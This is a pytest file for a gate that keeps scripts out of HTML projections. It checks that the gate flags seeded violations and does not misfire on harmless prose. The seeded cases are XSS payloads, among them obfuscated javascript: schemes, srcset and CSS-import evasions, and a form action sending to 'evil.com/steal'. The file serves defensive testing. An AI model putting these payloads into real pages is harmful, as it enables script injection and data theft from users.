"""M4: zero-script gate tests (HPRJ SPR-02).

The gate catches EACH class of script violation (script tag, uppercase,
on*=, javascript:, external src, css expression), not just <script>. It
is GREEN on the full golden corpus and RED on seeded violations per
class. It is stdlib-only.
"""

from __future__ import annotations

import inspect
import sys

import pytest

from services.html_projection import render, RenderContext
from services.html_projection.gate import (
    ScriptViolation,
    assert_script_free,
    find_violations,
    is_script_free,
)
from services.html_projection.tests.fixtures.golden import golden_corpus


# ── GREEN on golden corpus ──


@pytest.mark.parametrize("idx", range(len(golden_corpus())))
def test_gate_green_on_golden_corpus(ctx, idx):
    """Every golden-corpus projection is script-free (gate GREEN)."""
    html = render(golden_corpus()[idx], ctx)
    assert is_script_free(html), find_violations(html)
    # assert_script_free does not raise.
    assert_script_free(html)


# ── RED on seeded violations per class ──


@pytest.mark.parametrize(
    "html,expected_kind",
    [
        # script_tag class — lowercase, uppercase, close tag.
        ("<script>alert(1)</script>", "script_tag"),
        ("<SCRIPT>alert(1)</SCRIPT>", "script_tag"),
        ("</script>", "script_tag"),
        ("< script>alert(1)</script>", "script_tag"),
        ("<SCRIPT\nfoo>", "script_tag"),
        # event_handler class — on*= attrs, any case.
        ('<img onload=alert(1)>', "event_handler"),
        ('<div ONERROR="x">', "event_handler"),
        ('<body onload="init()">', "event_handler"),
        ('<svg onclick="evil()">', "event_handler"),
        # javascript_href class — quoted, unquoted, entity-obfuscated,
        # whitespace-obfuscated.
        ('<a href="javascript:alert(1)">x</a>', "javascript_href"),
        ("<a href=javascript:alert(1)>x</a>", "javascript_href"),
        ('<a href="jav&#97;script:alert(1)">x</a>', "javascript_href"),
        ('<a href="java\tscript:alert(1)">x</a>', "javascript_href"),
        ('<a href="vbscript:msgbox">x</a>', "javascript_href"),
        ('<form action="javascript:alert(1)">', "javascript_href"),
        # external_img_src class — https, protocol-relative, other tags.
        ('<img src="https://evil.com/x.png">', "external_img_src"),
        ('<img src="//evil.com/x.png">', "external_img_src"),
        ('<iframe src="http://x.com">', "external_img_src"),
        ('<audio src="https://x.com/a.mp3">', "external_img_src"),
        ('<source src="//cdn.com/v.mp4">', "external_img_src"),
        # srcset evasion — URL-bearing attr on img/source that browsers
        # fetch; the canonical evasion of a src-only external-asset check.
        ('<img srcset="https://evil.com/x.png 2x">', "external_img_src"),
        ('<source srcset="//cdn.com/v.mp4">', "external_img_src"),
        # css_expression class — in <style> and in style= attr.
        ("<style>x{width:expression(alert(1))}</style>", "css_expression"),
        ('<p style="width:expression(alert(1))">x</p>', "css_expression"),
        # external_css_src class — @import and url() to a remote endpoint
        # (CSS exfil + remote-CSS fetch+exec), in <style> and style= attr.
        ('<style>@import url("https://evil.com/x.css")</style>', "external_css_src"),
        ('<p style="background:url(https://evil.com/x.png)">x</p>', "external_css_src"),
        # javascript_href with raw NUL control char in the scheme —
        # browsers strip NUL before scheme resolution, so java\x00script:
        # resolves to javascript:.
        ('<a href="java\x00script:alert(1)">x</a>', "javascript_href"),
        # external_nav_redirect class — meta refresh + base href to a
        # remote origin (redirect / relative-URL hijack at ingest time).
        ('<meta http-equiv="refresh" content="0;url=https://evil.com">', "external_nav_redirect"),
        ('<base href="https://evil.com/">', "external_nav_redirect"),
        # additional external-fetch vectors (zero-script lens follow-up):
        # <object data>, <link href>, <svg><use href>, <form action> to a
        # remote origin — fetch remote content / navigate external at
        # ingest time, same self-contained-invariant class.
        ('<object data="https://evil.com/applet"></object>', "external_nav_redirect"),
        ('<link rel="stylesheet" href="https://evil.com/x.css">', "external_nav_redirect"),
        ('<svg><use href="https://evil.com/s.svg#i"></use></svg>', "external_nav_redirect"),
        ('<form action="https://evil.com/steal"></form>', "external_nav_redirect"),
    ],
)
def test_gate_red_on_seeded_violation(html, expected_kind):
    """Each seeded violation is caught (gate RED) and the right class is
    reported. A gate that only catches <script> would fail these."""
    violations = find_violations(html)
    kinds = [v.kind for v in violations]
    assert expected_kind in kinds, (
        f"expected {expected_kind} in {kinds} for {html!r}"
    )
    with pytest.raises(ScriptViolation):
        assert_script_free(html)


def test_gate_catches_all_classes_not_just_script():
    """The gate is not a <script>-only rubber stamp: a doc with no
    <script> but with an event handler still goes red."""
    html = '<img onerror="alert(1)" src="x">'
    violations = find_violations(html)
    assert any(v.kind == "event_handler" for v in violations)
    assert not any(v.kind == "script_tag" for v in violations)


# ── No false positives on legitimate prose ──


@pytest.mark.parametrize(
    "html",
    [
        # Prose mentioning "javascript:" (a security notebook documenting XSS).
        "<p>javascript:alert(1) in prose</p>",
        # Prose with "online = value" (looks like on*= but isn't).
        "<p>online = connected</p>",
        # Escaped script tag in prose (already escaped by renderer).
        "<p>a &lt;script&gt; tag</p>",
        # Internal + external citation links (references, not assets).
        '<a href="/internal/path">link</a>',
        '<a href="https://example.com">external cite</a>',
        # Prose with "expression(x)" (math text, not CSS).
        "<p>the expression(x) evaluates</p>",
        # Prose mentioning CSS-fetch tokens (not inside a <style> or style=
        # attr, so not a real fetch vector).
        "<p>use @import url(...) carefully</p>",
        "<p>background:url(x) is shorthand</p>",
        # Prose mentioning srcset (not an attribute on img/source).
        "<p>the srcset attribute lists URLs</p>",
        # meta refresh with a RELATIVE url= (not external nav).
        '<meta http-equiv="refresh" content="0;url=/internal">',
        # <base href> with a relative href (not external).
        '<base href="/app/">',
        # The word "script" in prose.
        "<p>the script ran</p>",
    ],
)
def test_gate_no_false_positives_on_prose(html):
    """Legitimate prose that mentions dangerous-looking strings does not
    false-fire the gate."""
    assert is_script_free(html), find_violations(html)


# ── Gate is stdlib-only (SPR-07 reuse) ──


def test_gate_module_is_stdlib_only():
    """The gate imports only stdlib modules (so SPR-07 can reuse it on
    the ingest side without pulling third-party deps)."""
    import services.html_projection.gate as gate_mod

    src = inspect.getsource(gate_mod)
    # Extract all top-level import statements.
    import re

    imports = re.findall(
        r"^\s*(?:import|from)\s+([a-zA-Z_][a-zA-Z0-9_]*)", src, re.MULTILINE
    )
    stdlib_prefixes = {
        "re", "json", "os", "sys", "dataclasses", "typing", "collections",
        "io", "html", "urllib", "functools", "itertools", "string",
        "__future__",
    }
    for imp in imports:
        top = imp.split(".")[0]
        assert top in stdlib_prefixes, (
            f"gate imports non-stdlib module {imp!r}; gate must be "
            f"stdlib-only for SPR-07 ingest-side reuse"
        )


def test_gate_has_no_third_party_deps_in_sys_modules():
    """Confirm the gate doesn't transitively import anything heavy. The
    gate module + its direct stdlib imports are all that's needed."""
    # Just exercising import doesn't pull third-party; the test above
    # pins the source. This is a belt-and-braces sanity check.
    import services.html_projection.gate as gate_mod

    assert hasattr(gate_mod, "assert_script_free")
    assert hasattr(gate_mod, "find_violations")
    assert hasattr(gate_mod, "is_script_free")


# ── Gate runs on full projection (integration with renderer) ──


def test_gate_catches_violation_injected_into_real_projection(ctx):
    """If a (hypothetical) partial slipped a script into a real
    projection, the gate catches it. Proves the gate runs on the full
    rendered output, not a stub."""
    html = render(golden_corpus()[0], ctx)
    injected = html.replace("</main>", "<script>evil()</script></main>")
    with pytest.raises(ScriptViolation):
        assert_script_free(injected)


def test_gate_violation_carries_diagnostics():
    """A ScriptViolation carries the violation kind + match for
    diagnostics (so an operator can find the offending bytes)."""
    html = '<img onload="x">'
    with pytest.raises(ScriptViolation) as exc_info:
        assert_script_free(html)
    assert len(exc_info.value.violations) >= 1
    v = exc_info.value.violations[0]
    assert v.kind == "event_handler"
    assert "onload" in v.match
